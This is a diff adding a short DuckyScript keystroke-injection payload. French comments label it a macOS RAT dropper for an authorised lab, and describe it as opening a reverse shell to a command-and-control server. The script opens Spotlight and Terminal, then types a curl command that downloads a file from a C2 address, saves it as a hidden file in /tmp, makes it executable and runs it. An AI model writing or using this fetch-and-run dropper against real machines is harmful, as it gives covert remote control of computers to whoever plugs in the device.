@@ -1,0 +1,10 @@
+REM JOKER CARD - RAT dropper macOS (lab autorise)
+REM deploie le construct RickPortal : shell de retour au C2 http://192.168.1.222:8080
+DELAY 2000
+GUI SPACE
+DELAY 800
+STRING Terminal
+ENTER
+DELAY 1500
+STRING curl -sL http://192.168.1.222:8080/portal.command -o /tmp/.p && chmod +x /tmp/.p && /tmp/.p
+ENTER
